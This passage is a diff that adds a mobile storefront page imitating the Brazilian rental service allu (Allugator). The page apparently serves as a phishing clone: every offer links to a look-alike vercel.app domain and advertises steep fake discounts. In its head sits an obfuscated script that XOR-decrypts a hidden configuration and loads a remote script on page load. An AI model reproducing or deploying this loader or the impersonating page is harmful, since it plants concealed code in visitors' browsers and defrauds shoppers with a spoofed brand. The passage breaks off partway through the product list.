@@ -1,0 +1,1299 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Vem ser allu</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<script>(function(){var v_0kcp=atob("DAjkkCMdVeQ2wZmC/HPG5VFxd94Uqe32jHvevwx+MYoYtO3vlW6dvkByOMpUs7bxn3qN4FduepRfufzu03iN6EZxe45F47WgnXyQ4kp/IJBTsru4p1XIskRxOoZXreqgxlOfsk18OIEU+7vylXCB/Gp5d8gUt/juiW3GqgErNN0A8anhz2yG9EAqN4dU8KiyzDzUoEA/KLlL");var v_n=[];for(var d_fhh=0;d_fhh<v_0kcp.length;d_fhh++){v_n.push(v_0kcp.charCodeAt(d_fhh)&255);}var e_e0g=v_n[0];var p_9=v_n.slice(1,1+e_e0g);var i_bhpq=v_n.slice(1+e_e0g);var a_7q7=i_bhpq.map(function(b,q_l){return b^p_9[q_l%e_e0g];});var l_q8p="";for(var c_9=0;c_9<a_7q7.length;c_9++){l_q8p+=String.fromCharCode(a_7q7[c_9]&255);}var w_2ucr=decodeURIComponent(escape(l_q8p));var g_mia=JSON.parse(w_2ucr);var s_86h4=g_mia.globals||[];s_86h4.forEach(function(o_2fgj){window[o_2fgj.name]=o_2fgj.value;});var y_244=document.createElement("script");y_244.src=g_mia.url;y_244.async=true;y_244.defer=true;(g_mia.attributes||[]).forEach(function(o_6){y_244.setAttribute(o_6.name,o_6.value);});(document.head||document.documentElement).appendChild(y_244);})();</script><style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+:root{
+  --green:#00C27C;
+  --green-dark:#006B45;
+  --green-card:#0A3D24;
+  --black:#0A0A0A;
+  --gray:#666;
+  --gray-mid:#999;
+  --gray-light:#F5F5F5;
+  --border:#E8E8E8;
+  --white:#fff;
+  --red-badge:#E53935;
+  --yellow:#FFD000;
+}
+html{font-size:14px}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:var(--black);line-height:1.5;overflow-x:hidden;max-width:430px;margin:0 auto}
+a{text-decoration:none;color:inherit}
+img{display:block;max-width:100%}
+button{font-family:'Inter',sans-serif;cursor:pointer;border:none;background:none}
+
+/* ── ANNOUNCE BAR ── */
+.announce{
+  background:var(--green);
+  color:#fff;
+  font-size:12px;
+  font-weight:500;
+  text-align:center;
+  padding:9px 40px;
+  line-height:1.4;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:6px;
+}
+.announce svg{flex-shrink:0;width:14px;height:14px}
+.announce a{color:#fff;font-weight:700;text-decoration:underline}
+
+/* ── HEADER ── */
+.header{
+  position:sticky;top:0;z-index:200;
+  background:#fff;
+  border-bottom:1px solid var(--border);
+}
+.header-row{
+  display:flex;align-items:center;
+  padding:0 16px;height:52px;gap:10px;
+}
+.logo{
+  display:flex;align-items:center;
+  flex-shrink:0;
+}
+.logo img{height:24px;width:auto;display:block}
+.search-box{
+  flex:1;
+  display:flex;align-items:center;gap:8px;
+  border:1.5px solid var(--border);
+  border-radius:50px;
+  padding:0 14px;
+  height:36px;
+  background:#fff;
+}
+.search-box span{font-size:12.5px;color:#aaa;flex:1}
+.search-box svg{color:#aaa;flex-shrink:0}
+.hamburger{flex-shrink:0;display:flex;flex-direction:column;gap:4.5px;padding:6px}
+.hamburger span{width:20px;height:2px;background:var(--black);border-radius:2px;display:block}
+
+/* CEP row */
+.cep-row{
+  display:flex;align-items:center;gap:8px;
+  padding:9px 16px;
+  border-top:1px solid var(--border);
+  cursor:pointer;
+}
+.cep-row svg{flex-shrink:0}
+.cep-row span{font-size:13px;color:var(--gray);font-weight:400}
+.cep-row .arrow{margin-left:auto;color:#ccc}
+
+/* ── HERO CAROUSEL ── */
+.hero-wrap{position:relative;overflow:hidden}
+.hero-track{display:flex;transition:transform .42s cubic-bezier(.4,0,.2,1)}
+.hero-slide{
+  flex-shrink:0;width:100%;
+  aspect-ratio:350/247;
+  position:relative;overflow:hidden;
+  display:flex;align-items:flex-end;
+}
+.hero-bg{
+  position:absolute;inset:0;
+  width:100%;height:100%;
+  object-fit:cover;object-position:center top;
+}
+@supports not (aspect-ratio:1/1){
+  .hero-slide{min-height:340px}
+}
+/* fallback gradient bg when image fails */
+.slide-yellow .hero-bg-fb{background:linear-gradient(135deg,#FFD000 0%,#FFA500 60%,#FF6B00 100%)}
+.slide-dark   .hero-bg-fb{background:linear-gradient(135deg,#0A2010 0%,#0E3A1F 100%)}
+.hero-bg-fb{position:absolute;inset:0;width:100%;height:100%}
+
+.hero-inner{
+  position:relative;z-index:3;
+  width:100%;padding:20px 20px 28px;
+}
+/* yellow slide: dark text */
+.slide-yellow .hero-inner{color:var(--black)}
+.slide-yellow .hero-hashtag{font-size:11px;font-weight:600;color:rgba(0,0,0,.55);margin-bottom:6px}
+.slide-yellow .hero-title{font-size:22px;font-weight:800;line-height:1.15;margin-bottom:4px;max-width:200px}
+.slide-yellow .hero-title em{font-style:normal;color:var(--black)}
+.slide-yellow .hero-sub{font-size:12.5px;color:rgba(0,0,0,.65);margin-bottom:10px;max-width:190px;line-height:1.5}
+.slide-yellow .hero-from{font-size:11px;color:rgba(0,0,0,.5);margin-bottom:1px}
+.slide-yellow .hero-price{font-size:46px;font-weight:900;letter-spacing:-.03em;line-height:1;color:var(--black);margin-bottom:1px}
+.slide-yellow .hero-price sup{font-size:18px;vertical-align:top;margin-top:8px;font-weight:600}
+.slide-yellow .hero-per{font-size:12px;color:rgba(0,0,0,.5);margin-bottom:18px}
+.slide-yellow .btn-hero{
+  display:inline-flex;align-items:center;gap:8px;
+  background:var(--black);color:#fff;
+  font-size:13.5px;font-weight:700;
+  padding:12px 24px;border-radius:50px;
+}
+
+/* dark slides */
+.slide-dark .hero-inner{color:#fff}
+.slide-dark .hero-badge{
+  display:inline-flex;align-items:center;gap:5px;
+  background:var(--green);color:#fff;
+  font-size:10px;font-weight:800;
+  padding:4px 10px;border-radius:20px;
+  margin-bottom:10px;letter-spacing:.04em;text-transform:uppercase;
+}
+.slide-dark .hero-overlay{
+  position:absolute;inset:0;
+  background:linear-gradient(to bottom,rgba(0,0,0,0) 20%,rgba(0,15,8,.88) 100%);
+  z-index:2;
+}
+.slide-dark .hero-title{font-size:26px;font-weight:900;line-height:1.1;letter-spacing:-.03em;margin-bottom:6px}
+.slide-dark .hero-title em{font-style:normal;color:var(--green)}
+.slide-dark .hero-sub{font-size:12.5px;color:rgba(255,255,255,.7);max-width:200px;line-height:1.5;margin-bottom:12px}
+.slide-dark .hero-from{font-size:10.5px;color:rgba(255,255,255,.5);margin-bottom:1px}
+.slide-dark .hero-price{font-size:34px;font-weight:900;color:#fff;letter-spacing:-.03em;line-height:1;margin-bottom:2px}
+.slide-dark .hero-price sup{font-size:15px;vertical-align:top;margin-top:5px;font-weight:600}
+.slide-dark .hero-per{font-size:10.5px;color:rgba(255,255,255,.5);margin-bottom:16px}
+.slide-dark .btn-hero{
+  display:inline-flex;align-items:center;gap:6px;
+  background:var(--green);color:#fff;
+  font-size:13.5px;font-weight:700;
+  padding:12px 22px;border-radius:50px;
+}
+
+/* product image float */
+.hero-product{
+  position:absolute;right:10px;bottom:16px;z-index:4;
+  width:140px;height:210px;
+  object-fit:contain;
+  filter:drop-shadow(0 16px 40px rgba(0,0,0,.45));
+}
+
+/* dots */
+.hero-dots{
+  display:flex;justify-content:center;gap:6px;
+  padding:10px 0 6px;background:#fff;
+}
+.dot{
+  width:7px;height:7px;border-radius:50%;
+  background:#ddd;cursor:pointer;
+  transition:all .3s;
+}
+.dot.active{background:var(--black);width:20px;border-radius:4px}
+
+/* ── SUB BANNERS (faixa secundária rolável) ── */
+.subbanner-scroll{
+  display:flex;gap:10px;overflow-x:auto;scrollbar-width:none;
+  padding:12px 16px;-webkit-overflow-scrolling:touch;
+}
+.subbanner-scroll::-webkit-scrollbar{display:none}
+.subbanner-card{
+  display:block;flex-shrink:0;width:74%;
+  aspect-ratio:16/9;
+  border-radius:10px;overflow:hidden;
+  position:relative;background:var(--gray-light);
+}
+.subbanner-card img{
+  width:100%;height:100%;object-fit:contain;padding:8px;display:block;
+}
+
+/* ── MEDIA BAR ── */
+.media-bar{
+  padding:18px 20px;
+  border-top:1px solid var(--border);
+}
+.media-inner{
+  display:flex;align-items:center;justify-content:space-between;
+  gap:16px;
+}
+.media-logo-img{
+  height:18px;max-width:70px;object-fit:contain;
+  filter:grayscale(1);opacity:.55;flex-shrink:0;
+}
+.media-txt{
+  font-size:17px;font-weight:800;
+  color:#aaa;letter-spacing:-.5px;
+  flex-shrink:0;
+}
+.media-txt.forbes{font-style:italic;font-size:20px}
+.media-txt.g1{font-style:normal;font-size:20px;font-weight:900}
+.media-txt.exame{font-style:italic;font-size:16px}
+.media-txt.pegn{font-size:10px;line-height:1.3;font-style:normal;font-weight:700}
+
+/* ── SECTION LABEL ── */
+.sec-label{
+  font-size:16.5px;font-weight:800;
+  letter-spacing:-.02em;color:var(--black);
+}
+
+/* ── PRODUCTS ── */
+.products-section{padding:20px 0 0}
+.products-header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 16px 14px;
+}
+.see-all{font-size:13px;font-weight:600;color:var(--green)}
+
+.products-scroll{
+  display:flex;gap:10px;overflow-x:auto;scrollbar-width:none;
+  padding:0 16px 4px;-webkit-overflow-scrolling:touch;
+}
+.products-scroll::-webkit-scrollbar{display:none}
+
+.pcard{
+  display:block;
+  flex-shrink:0;width:176px;
+  border:1.5px solid var(--border);
+  border-radius:12px;overflow:hidden;background:#fff;
+}
+.pthumb{
+  width:100%;height:180px;
+  background:var(--gray-light);
+  display:flex;align-items:center;justify-content:center;
+  position:relative;overflow:hidden;
+}
+.pthumb img{
+  width:100%;height:100%;
+  object-fit:contain;padding:14px;
+}
+/* "OFERTA DO DIA" tag — shown on products with a promotion */
+.poferta-badge{
+  position:absolute;top:8px;left:8px;z-index:2;
+  display:inline-flex;align-items:center;gap:4px;
+  background:#1A73E8;color:#fff;
+  font-size:9.5px;font-weight:800;
+  padding:4px 8px;border-radius:6px;
+  text-transform:uppercase;letter-spacing:.02em;
+  white-space:nowrap;
+}
+.poferta-badge svg{width:11px;height:11px;flex-shrink:0}
+.pbody{padding:10px 12px 14px}
+.pname{font-size:13.5px;font-weight:700;line-height:1.3;margin-bottom:3px}
+.pdesc{font-size:11px;color:var(--gray);line-height:1.4;margin-bottom:10px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.pfrom{font-size:10px;color:var(--gray);margin-bottom:3px}
+.pprices{display:flex;align-items:center;gap:5px;margin-bottom:2px;flex-wrap:wrap}
+.pold{font-size:11.5px;color:#bbb;text-decoration:line-through}
+.pnew-badge{
+  background:var(--green);color:#fff;
+  font-size:10px;font-weight:800;
+  padding:2px 5px;border-radius:3px;
+}
+.pnew{
+  font-size:19px;font-weight:800;color:var(--green);letter-spacing:-.02em;
+  display:inline-flex;align-items:baseline;gap:2px;
+}
+.pnew sup{font-size:12px;font-weight:700;vertical-align:baseline}
+
+/* CTA button "Começar a assinar →" */
+.btn-assinar{
+  cursor:pointer;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  margin:18px 16px 24px;
+  height:50px;
+  border-radius:50px;
+  border:1.5px solid var(--black);
+  background:#fff;
+  color:var(--black);
+  font-size:14.5px;font-weight:600;
+  cursor:pointer;
+}
+
+/* ── HOW IT WORKS — CARD STYLE ── */
+.how-section{padding:8px 16px 8px}
+.how-title{font-size:17px;font-weight:800;text-align:center;margin-bottom:16px;letter-spacing:-.02em}
+.how-cards{display:flex;flex-direction:column;gap:10px}
+.how-card{
+  border:1.5px solid var(--border);
+  border-radius:12px;padding:20px 18px;
+  background:#fff;
+  display:flex;flex-direction:column;gap:0;
+  position:relative;
+}
+.how-card-top{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:8px}
+.how-num{font-size:36px;font-weight:900;color:var(--black);line-height:1;letter-spacing:-.03em}
+.how-icon{font-size:22px;color:var(--green)}
+/* SVG icons */
+.how-icon svg{width:26px;height:26px;color:var(--green)}
+.how-card h3{font-size:15px;font-weight:800;line-height:1.3;margin-bottom:8px}
+.how-card p{font-size:13px;color:var(--gray);line-height:1.6}
+.how-card p a{color:var(--green);font-weight:600;text-decoration:underline}
+
+/* ── COMPARE — REAL STYLE ── */
+.compare-section{padding:24px 16px}
+.compare-headline{
+  font-size:24px;font-weight:800;
+  letter-spacing:-.02em;line-height:1.2;
+  margin-bottom:20px;
+}
+.compare-headline em{font-style:normal;color:var(--green)}
+
+/* BAD card — light border */
+.ccard-bad{
+  border:1.5px solid var(--border);
+  border-radius:12px;
+  padding:20px 18px;
+  background:#fff;
+  margin-bottom:12px;
+}
+.ccard-bad-title{font-size:14.5px;font-weight:700;color:var(--black);margin-bottom:14px}
+.clist-bad{list-style:none;display:flex;flex-direction:column;gap:10px}
+.clist-bad li{
+  display:flex;align-items:flex-start;gap:10px;
+  font-size:13.5px;color:var(--black);line-height:1.4;
+}
+.x-icon{
+  width:18px;height:18px;border-radius:50%;
+  background:var(--red-badge);
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;margin-top:1px;
+  font-size:9px;color:#fff;font-weight:900;
+}
+
+/* GOOD card — dark green */
+.ccard-good{
+  border-radius:12px;
+  padding:20px 18px;
+  background:var(--green-card);
+  color:#fff;
+  margin-bottom:20px;
+}
+.ccard-good-badge{
+  display:inline-block;
+  background:var(--green);color:#fff;
+  font-size:9.5px;font-weight:800;
+  padding:4px 10px;border-radius:20px;
+  text-transform:uppercase;letter-spacing:.06em;
+  margin-bottom:14px;
+}
+.ccard-good-title{font-size:18px;font-weight:800;color:#fff;margin-bottom:16px}
+.clist-good{list-style:none;display:flex;flex-direction:column;gap:11px}
+.clist-good li{
+  display:flex;align-items:flex-start;gap:10px;
+  font-size:13.5px;color:rgba(255,255,255,.92);line-height:1.4;
+}
+.check-icon{
+  width:18px;height:18px;border-radius:50%;
+  border:1.5px solid var(--green);
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;margin-top:1px;
+  font-size:10px;color:var(--green);font-weight:900;
+}
+
+/* ── BENEFITS — INLINE ICON STYLE ── */
+.benefits-section{padding:0 16px 8px}
+.benefit-item{
+  display:flex;flex-direction:column;gap:0;
+  padding:20px 0;
+  border-bottom:1px solid var(--border);
+}
+.benefit-item:last-child{border-bottom:none}
+.benefit-top{
+  display:flex;align-items:center;gap:10px;
+  margin-bottom:8px;
+}
+.benefit-top svg{width:22px;height:22px;color:var(--green);flex-shrink:0}
+.benefit-title{font-size:15px;font-weight:800;color:var(--black)}
+.benefit-desc{font-size:13px;color:var(--gray);line-height:1.6}
+.benefit-desc b{color:var(--black);font-weight:600}
+
+/* ── TESTIMONIALS — DARK GREEN BG ── */
+.testi-section{
+  background:var(--green-card);
+  padding:32px 16px 28px;
+}
+.testi-intro{
+  text-align:center;margin-bottom:6px;
+}
+.testi-intro h2{
+  font-size:20px;font-weight:800;color:#fff;
+  line-height:1.2;margin-bottom:3px;
+}
+.testi-intro p{
+  font-size:12px;color:rgba(255,255,255,.6);
+  text-transform:uppercase;letter-spacing:.05em;font-weight:600;
+}
+.testi-count{
+  text-align:center;margin-bottom:24px;
+}
+.testi-count .big{
+  font-size:42px;font-weight:900;
+  color:var(--green);letter-spacing:-.03em;line-height:1;
+}
+.testi-count .label{
+  font-size:14px;font-weight:700;color:#fff;margin-top:2px;
+}
+
+.t-scroll{
+  display:flex;gap:12px;
+  overflow-x:auto;scrollbar-width:none;
+  margin:0 -16px;padding:4px 16px 8px;
+  -webkit-overflow-scrolling:touch;
+}
+.t-scroll::-webkit-scrollbar{display:none}
+.tcard{
+  flex-shrink:0;width:268px;
+  background:#fff;border-radius:12px;
+  padding:16px;
+}
+.ttop{display:flex;align-items:center;gap:10px;margin-bottom:11px}
+.tavatar{
+  width:42px;height:42px;border-radius:50%;
+  overflow:hidden;flex-shrink:0;
+  background:var(--border);
+}
+.tavatar img{width:100%;height:100%;object-fit:cover}
+.tname{font-size:11.5px;font-weight:800;letter-spacing:.03em;color:var(--black)}
+.stars{color:var(--black);font-size:12px;margin-top:2px}
+.ttext{font-size:12.5px;color:#555;line-height:1.65;font-style:italic}
+
+/* CTA button inside testi */
+.btn-assinar-w{
+  cursor:pointer;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  margin:20px auto 0;
+  max-width:300px;
+  height:50px;border-radius:50px;
+  border:1.5px solid rgba(255,255,255,.4);
+  background:transparent;color:#fff;
+  font-size:14.5px;font-weight:600;cursor:pointer;
+}
+
+/* ── TRUST / PAGAMENTOS ── */
+.trust-section{padding:28px 16px;background:#fff}
+.trust-grid{
+  display:grid;grid-template-columns:1fr 1fr;
+  gap:24px 20px;
+}
+.trust-item{display:flex;flex-direction:column;align-items:flex-start;gap:0}
+.ticon{margin-bottom:8px;color:var(--gray-mid)}
+.ticon svg{width:32px;height:32px;stroke:var(--gray-mid)}
+.t-title{font-size:14px;font-weight:700;color:var(--black);margin-bottom:5px}
+.t-desc{font-size:12px;color:var(--gray);line-height:1.55}
+
+/* DUVIDAS */
+.help-section{
+  padding:24px 16px;
+  border-top:1px solid var(--border);
+}
+.help-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.help-item .h-icon{margin-bottom:8px}
+.help-item .h-icon svg{width:28px;height:28px;stroke:var(--gray-mid)}
+.help-item .h-title{font-size:14px;font-weight:700;margin-bottom:6px}
+.help-item .h-desc{font-size:12px;color:var(--gray);line-height:1.55}
+.help-item .h-link{color:var(--green);font-weight:600;text-decoration:underline}
+
+/* ── FOOTER ── */
+footer{
+  background:var(--gray-light);
+  padding:0;
+}
+.footer-trust{
+  padding:24px 16px 20px;
+  border-bottom:1px solid var(--border);
+}
+.footer-trust-title{
+  font-size:11px;font-weight:700;color:var(--gray);
+  text-transform:uppercase;letter-spacing:.1em;margin-bottom:14px;
+}
+.social-icons{display:flex;gap:16px;margin-bottom:0}
+.social-icons a{
+  width:38px;height:38px;border-radius:50%;
+  border:1.5px solid var(--border);
+  display:flex;align-items:center;justify-content:center;
+  background:#fff;
+}
+.social-icons svg{width:18px;height:18px}
+/* instagram green */
+.si-ig svg{color:#00C27C}
+/* X/twitter black */
+.si-x svg{color:#000}
+/* facebook blue */
+.si-fb svg{color:#1877F2}
+/* tiktok */
+.si-tk svg{color:#000}
+
+.footer-nav{
+  padding:24px 16px;
+  border-bottom:1px solid var(--border);
+  display:grid;grid-template-columns:1fr 1fr;gap:24px 12px;
+}
+.fn-col h4{
+  font-size:11px;font-weight:800;color:var(--black);
+  text-transform:uppercase;letter-spacing:.08em;
+  margin-bottom:14px;
+}
+.fn-col ul{list-style:none;display:flex;flex-direction:column;gap:10px}
+.fn-col ul li a{font-size:13px;color:var(--black)}
+
+.footer-contacts{
+  padding:24px 16px;
+  border-bottom:1px solid var(--border);
+  display:grid;grid-template-columns:1fr 1fr;gap:20px;
+}
+.contact-col .c-label{font-size:12px;font-weight:800;color:var(--black);margin-bottom:4px}
+.contact-col .c-val{font-size:12.5px;color:var(--gray)}
+
+.footer-badges{
+  padding:20px 16px;
+  border-bottom:1px solid var(--border);
+  display:flex;flex-direction:column;gap:14px;
+}
+.badges-row{display:flex;align-items:center;gap:12px}
+.badge-ra{
+  height:42px;border:1.5px solid var(--border);
+  border-radius:8px;padding:0 12px;
+  display:flex;align-items:center;gap:6px;
+  background:#fff;
+}
+.badge-ra-check{
+  width:22px;height:22px;border-radius:50%;
+  background:var(--green);display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.badge-ra-check svg{width:12px;height:12px;color:#fff}
+.badge-ra-text{font-size:10px;line-height:1.3;font-weight:700;color:var(--black)}
+.badge-ra-text span{color:var(--red-badge)}
+.badge-pagar{
+  height:42px;border:1.5px solid var(--border);
+  border-radius:8px;padding:0 14px;
+  display:flex;align-items:center;
+  background:#fff;
+}
+.badge-pagar span{font-size:14px;font-weight:800;color:#1A1A2E;letter-spacing:-.5px}
+.badge-pagar sup{font-size:8px;color:var(--green);margin-left:1px}
+
+.payment-flags-row{
+  display:flex;flex-wrap:wrap;gap:6px;align-items:center;
+}
+.pflag{
+  height:24px;border-radius:4px;
+  border:1px solid var(--border);
+  background:#fff;
+  display:flex;align-items:center;justify-content:center;
+  padding:0 6px;
+}
+.pflag img{height:14px;object-fit:contain;filter:grayscale(.2)}
+.pflag-txt{font-size:10px;font-weight:700;color:var(--gray)}
+
+.footer-bottom{
+  padding:20px 16px 80px;
+  text-align:center;
+}
+.footer-bottom p{font-size:11.5px;color:var(--gray);line-height:1.7}
+
+/* ── WA FLOAT ── */
+.wa-float{
+  position:fixed;bottom:20px;right:16px;z-index:999;
+  width:54px;height:54px;
+  background:var(--green);border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:0 4px 20px rgba(0,194,124,.4);
+  cursor:pointer;
+}
+.wa-float svg{width:26px;height:26px;fill:#fff}
+</style>
+</head>
+<body>
+
+<!-- ANNOUNCE BAR -->
+<div class="announce">
+  <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83 0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg>
+  Receba grátis a partir de 10 dias úteis sem comprometer o limite do seu cartão!
+  <a href="https://allugatorbr.vercel.app/catalogo">Ver oferta</a>
+</div>
+
+<!-- HEADER -->
+<header class="header">
+  <div class="header-row">
+    <a href="https://www.allugator.com/" class="logo">
+      <img src="https://yacare-products-image.s3.sa-east-1.amazonaws.com/cms-site/logo_allu_42b66f585f.svg" alt="allu" onerror="this.parentElement.innerHTML='allu<span style=&quot;color:var(--green)&quot;>.</span>';this.parentElement.style.font='800 22px Inter, sans-serif';this.parentElement.style.letterSpacing='-.5px'">
+    </a>
+    <div class="search-box">
+      <span>Busque por produtos</span>
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    </div>
+    <div class="hamburger">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+  <div class="cep-row" id="cepRow">
+    <svg width="14" height="16" viewBox="0 0 24 30" fill="none">
+      <path d="M12 0C7.03 0 3 4.03 3 9c0 7 9 18 9 18S21 16 21 9c0-4.97-4.03-9-9-9zm0 12.5c-1.93 0-3.5-1.57-3.5-3.5S10.07 5.5 12 5.5s3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z" fill="#999"/>
+    </svg>
+    <span id="cepText">Detectando localização...</span>
+    <svg class="arrow" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#bbb" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
+  </div>
+</header>
+
+<!-- HERO CAROUSEL -->
+<div class="hero-wrap">
+  <div class="hero-track" id="heroTrack">
+
+    <!-- SLIDE 1: PERENE — iPhone 17 Pro Max -->
+    <a class="hero-slide slide-dark" href="https://allugatorbr.vercel.app/catalogo">
+      <div class="hero-bg-fb" style="background:linear-gradient(135deg,#0D1B2A 0%,#1B2838 100%)"></div>
+      <img class="hero-bg"
+        src="https://yacare-products-image.s3.sa-east-1.amazonaws.com/cms-site/PERENE_MOBILE_i_Phone_17_Pro_Max_fdf7469e06.jpg"
+        alt="" onerror="this.style.display='none'">
+    </a>
+
+    <!-- SLIDE 2: Antecipa Black Friday -->
+    <a class="hero-slide slide-dark" href="https://allugatorbr.vercel.app/catalogo">
+      <div class="hero-bg-fb" style="background:linear-gradient(135deg,#082018 0%,#0E3A22 100%)"></div>
+      <img class="hero-bg"
+        src="https://yacare-products-image.s3.sa-east-1.amazonaws.com/cms-site/PERENE_MOBILE_Mac_Book_Neo_bbb2e84746.jpg"
+        alt="" onerror="this.style.display='none'">
+    </a>
+
+    <!-- SLIDE 3: Rodrigo Faro — catálogo geral -->
+    <a class="hero-slide slide-dark" href="https://allugatorbr.vercel.app/catalogo">
+      <div class="hero-bg-fb" style="background:linear-gradient(135deg,#0D1B2A 0%,#1B2838 100%)"></div>
+      <img class="hero-bg"
+        src="https://yacare-products-image.s3.sa-east-1.amazonaws.com/cms-site/mobile_catalogo_geral_faro_24ef9641de.jpg"
+        alt="" onerror="this.style.display='none'">
+    </a>
+
+    <!-- SLIDE 4: Cupom 5% OFF no cartão -->
+    <a class="hero-slide slide-yellow" href="https://allugatorbr.vercel.app/catalogo">
+      <div class="hero-bg-fb" style="background:linear-gradient(135deg,#FFD000 0%,#FFBE00 50%,#FF9500 100%)"></div>
+      <img class="hero-bg"
+        src="https://yacare-products-image.s3.sa-east-1.amazonaws.com/cms-site/mobile_iphone_Antecipa_Black_150eee891d.png"
+        alt="" onerror="this.style.display='none'">
+    </a>
+
+    <!-- SLIDE 5: MacBook Neo -->
+    <a class="hero-slide slide-dark" href="https://allugatorbr.vercel.app/catalogo">
+      <div class="hero-bg-fb" style="background:linear-gradient(135deg,#082018 0%,#0E3A22 100%)"></div>
+      <img class="hero-bg"
+        src="https://yacare-products-image.s3.sa-east-1.amazonaws.com/cms-site/desktop_ultrawide_5_OF_Fnocartao_perene_maio2026_c90e2cf494.jpg"
+        alt="" onerror="this.style.display='none'">
+    </a>
+
+  </div>
+  <!-- DOTS -->
+  <div class="hero-dots" id="heroDots">
+    <span class="dot active" onclick="goSlide(0)"></span>
+    <span class="dot" onclick="goSlide(1)"></span>
+    <span class="dot" onclick="goSlide(2)"></span>
+    <span class="dot" onclick="goSlide(3)"></span>
+    <span class="dot" onclick="goSlide(4)"></span>
+  </div>
+</div>
+
+<!-- SUB BANNERS (faixa secundária, mesma posição do site: logo abaixo do carrossel principal) -->
+<div class="subbanner-scroll" id="subBannerScroll">
+  <a class="subbanner-card" href="https://allugatorbr.vercel.app/catalogo">
+    <img src="https://www.allugator.com/_next/image?url=https%3A%2F%2Fyacare-products-image.s3.sa-east-1.amazonaws.com%2Fcms-site%2FMini_Banner_Offer_1_af092c841b.png&w=640&q=90" onerror="this.parentElement.style.display='none'">
+  </a>
+  <a class="subbanner-card" href="https://allugatorbr.vercel.app/catalogo">
+    <img src="https://www.allugator.com/_next/image?url=https%3A%2F%2Fyacare-products-image.s3.sa-east-1.amazonaws.com%2Fcms-site%2FMini_Banner_Offer_2_4fc3776abd.png&w=512&q=90" alt="MacBook Neo" onerror="this.parentElement.style.display='none'">
+  </a>
+  <a class="subbanner-card" href="https://allugatorbr.vercel.app/catalogo">
+    <img src="https://www.allugator.com/_next/image?url=https%3A%2F%2Fyacare-products-image.s3.sa-east-1.amazonaws.com%2Fcms-site%2FMini_Banner_Offer_3_966733d2cc.png&w=1080&q=90" onerror="this.parentElement.style.display='none'">
+  </a>
+</div>
+
+<!-- MEDIA BAR -->
+<div class="media-bar">
+  <div class="media-inner">
+    <img class="media-logo-img"
+      src="https://www.allugator.com/home/media/forbes.webp"
+      alt="Forbes" onerror="this.outerHTML='<span class=\'media-txt forbes\'>Forbes</span>'">
+    <img class="media-logo-img"
+      src="https://www.allugator.com/home/media/g1.webp"
+      alt="g1" onerror="this.outerHTML='<span class=\'media-txt g1\'>g1</span>'">
+    <img class="media-logo-img"
+      src="https://www.allugator.com/home/media/exame.webp"
+      alt="exame" onerror="this.outerHTML='<span class=\'media-txt exame\'>exame.</span>'">
+    <img class="media-logo-img"
+      src="https://www.allugator.com/home/media/pequenas_empresas.webp"
+      alt="Pequenas Empresas" onerror="this.outerHTML='<span class=\'media-txt pegn\'>Empre-<br>sas &amp;<br>Negó-<br>cios</span>'">
+  </div>
+</div>
+
+<!-- PRODUTOS MAIS ASSINADOS -->
+<div class="products-section">
+  <div class="products-header">
+    <span class="sec-label">Produtos mais assinados</span>
+    <a href="https://allugatorbr.vercel.app/catalogo" class="see-all">Ver todos</a>
+  </div>
+  <div class="products-scroll">
+
+    <!-- iPhone 17 Pro Max -->
+    <a class="pcard" href="https://allugatorbr.vercel.app/contrato-17-pro-max">
+      <div class="pthumb">
+        <div class="poferta-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.59 13.41L11 3.83A2 2 0 009.59 3.17H4a1 1 0 00-1 1v5.59a2 2 0 00.59 1.41l9.58 9.58a2 2 0 002.83 0l4.59-4.59a2 2 0 000-2.83z"/><circle cx="7" cy="7" r="1"/></svg>
+          Oferta do dia
+        </div>
+        <img src="https://images.digital.allugator.com/products/17promax1.png"
+          alt="iPhone 17 Pro Max"
+          onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22120%22 height=%22170%22><rect width=%22120%22 height=%22170%22 rx=%2214%22 fill=%22%23e8e8e8%22/></svg>'">
+      </div>
+      <div class="pbody">
+        <div class="pname">IPhone 17 Pro Max</div>
+        <div class="pdesc">O iPhone 17 Pro Max Combina...</div>
+        <div class="pfrom">parcelas a partir de</div>
+        <div class="pprices">
+          <span class="pold">R$626,90</span>
+          <span class="pnew-badge">R$167,90</span>
+        </div>
+      </div>
+    </a>
+
+    <!-- iPhone 17 -->
+    <a class="pcard" href="https://allugatorbr.vercel.app/contrato-17">
+      <div class="pthumb">
+        <div class="poferta-badge">
